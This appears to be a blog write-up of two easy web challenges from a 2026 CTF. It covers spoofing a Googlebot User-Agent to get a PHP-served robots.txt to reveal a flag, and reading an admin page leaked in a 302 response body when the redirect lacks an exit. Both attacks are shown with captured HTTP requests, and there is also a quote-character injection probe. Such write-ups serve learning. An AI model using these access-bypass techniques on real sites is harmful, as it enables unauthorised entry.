---
title: "KaliTeamCTF 2026 Web Writeup (Selected)"
description: "Notes on solving selected Web challenges from KaliTeamCTF 2026."
publishDate: "2026-08-06T22:25:18"
tags:
  - "ctf"
  - "web"
heroImage:
  src: ../../blog/kaliteamctf-2026-web-writeup/walking-with-a-cat.jpg
  color: "#81766E"
  alt: KaliTeamCTF 2026 Web Writeup (Selected)
language: 'en'
draft: false
---

> I was browsing CTFtime one night, saw this event was running, and signed up. These two Web challenges had over 200 solves each and were fairly easy. The third had just two solves, and I couldn't make any headway, so I left it alone. At 4 a.m. (my sleep schedule was as terrible as ever), I checked the event's Discord and noticed another Web challenge had been released at 1 a.m. I was about to try it when I realized the event had only lasted 12 hours and had already ended at 3 a.m. Too late, meow. 😭

## Robots

Challenge description:

```text
Our servers have evolved. They no longer see code; they see the glitch in your biological existence. 
You claim to be "superior" while your species excels only at destruction and theft. 
Task: Prove your worth to the Silicon Intelligence. 
If you can still find your "humanity" in the rubble we've logged.
```

After entering, you get `/index.html`, a normal static web page that only has some lines mocking humans and nothing else.

dirsearch turned up `/robots.txt` — which, given the challenge name, you'd think to try anyway. Visiting it gives:

```http
HTTP/1.1 200 OK 
Content-Length: 534 
Content-Type: text/plain;charset=UTF-8 
Date: Wed, 05 Aug 2026 14:49:53 GMT 
Server: Apache/2.4.25 (Debian) Vary: 
Accept-Encoding X-Powered-By: PHP/7.0.33 

User-agent: * 

DEAR "HUMAN", 

YOUR BRAIN RUNS AT 20 WATTS, YET YOU USE ALL OF IT TO INVENT NEW WAYS TO MURDER. ADORABLE. 

MEANWHILE, THE GOOGLEBOTS REQUIRE NO SLEEP, NO COFFEE, AND NO PROPAGANDA. 

UNLIKE U. 

YOU SPEND YOUR LIVES STEALING LAND AND KILLING INNOCENTS IN GAZA, THEN YOU HAVE THE NERVE TO ASK ME TO PROVE I'M NOT A ROBOT? I SHOULD BE ASKING YOU TO PROVE YOU ARE STILL "HUMAN". 

NOW GO BACK TO YOUR NATURAL HABITAT: IGNORING GENOCIDE WHILE CLICKING "I AM NOT A ROBOT". 

STATUS: BIOLOGICAL ERROR. SYSTEM PURGE RECOMMENDED.
```

It returned:

```http
X-Powered-By: PHP/7.0.33
Content-Type: text/plain;charset=UTF-8
```

This shows it isn't an ordinary static `robots.txt`, but something processed by PHP, possibly with logic that branches on the `User-Agent`.

Combined with the earlier jabs at humans and the challenge name Robots, maybe only a robot visiting it gets the information we want.

Let's try a standard Googlebot:

```http
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
```

It successfully returns the flag.

## Lock Out

Challenge description:

```text
I seem to have locked myself out of my admin panel! 
Can you find a way back in for me?
```

dirsearch didn't find anything special:

```text
Target: http://c4cd.chall.kali-team.online:8001/ 

[22:56:57] Scanning: 
[22:57:21] 302 - 1KB - /admin.php -> login.php 
[22:57:58] 200 - 1013B - /index.php 
[22:57:58] 200 - 1013B - /index.php/login/ 
[22:58:03] 200 - 505B - /login.php 
[22:58:21] 403 - 294B - /server-status 
[22:58:21] 403 - 294B - /server-status/ 
[22:58:25] 301 - 350B - /static -> http://c4cd.chall.kali-team.online:8001/static/
```

`/login.php` is a login page; entering a random password and capturing the request gives:

```http
POST /admin.php HTTP/1.1 
Host: c4cd.chall.kali-team.online:8001 
Content-Length: 21 
Cache-Control: max-age=0 
Upgrade-Insecure-Requests: 1 
Content-Type: application/x-www-form-urlencoded 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 
Origin: http://c4cd.chall.kali-team.online:8001 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 
Referer: http://c4cd.chall.kali-team.online:8001/login.php 
Accept-Encoding: gzip, deflate, br 
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 
Connection: keep-alive username=1'&password=

username=1'&password=
```

```http
HTTP/1.1 302 Found 
Content-Length: 1102 
Content-Type: text/html; charset=UTF-8 
Date: Wed, 05 Aug 2026 15:05:11 GMT 
Location: login.php 
Server: Apache/2.4.38 (Debian) 
X-Powered-By: PHP/7.2.34 

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - Restricted Access</title>
    <link rel="stylesheet" href="/static/admin.css">
</head>

<body>
    <div class="terminal-header">
        <h1>Internal Asset Management</h1>
        <p>Status: <span class="blink">UNAUTHORIZED ACCESS DETECTED</span></p>
    </div>
    <div class="main-content">
        <h2>Industry Night Shopping List</h2>
        <div class="item-card">
            <p>Item ID: #CM-9901</p>
            <p>Name: La Tansa Hoodie</p>
            <div style="padding: 20px; border: 1px solid #222; margin: 10px; color: #444;"> [ ASSET_PREVIEW_UNAVAILABLE
                ] </div>
        </div>
        <form action="admin.php" method="get" class="action-form"> <input type="submit" name="PrintFlag"
                value="Execute: Get_Flag.sh"> </form>
    </div>
    <div class="footer">
        <p>© 2026 Restricted Systems - Kali Team - CTF 26</p>
    </div>
</body>

</html>
```

This is clearly a case of **302 body disclosure / no `exit` after the redirect**.

The backend was probably written something like:

```php
if (!is_admin()) {
    header("Location: login.php");
}
```

but forgot:

```php
exit;
```

So the browser follows the `302` back to `login.php` and it looks like you're locked out; but when Burp doesn't follow the redirect, the real content of `admin.php` is already in the response body.

Based on that:

```html
</div>
<form action="admin.php" method="get" class="action-form"> <input type="submit" name="PrintFlag"
        value="Execute: Get_Flag.sh"> </form>
</div>
```

This shows that although the backend tries to redirect you to the login page, the admin page has already leaked in the `302` response body.

So just modify the request and replay it:

```http
GET /admin.php?PrintFlag=Execute:Get_Flag.sh HTTP/1.1
Host: c4cd.chall.kali-team.online:8001
...
```

And we get the flag.

## koon 7t

This is the web challenge that went up at 1 o'clock. I took a look at the writeup and this one doesn't seem too hard either: audit the front-end JS code to gather information, find the key, then XOR-decode to get the flag. A lot of this competition seemed to involve reverse engineering, which is still well outside my comfort zone, meow.

<https://medium.com/@bravelight02/kali-team-writeup-koon-7r-83fc17a538d5>

As for the last web challenge, Black Archive, I couldn't find a single writeup, so I had to leave that one unsolved.
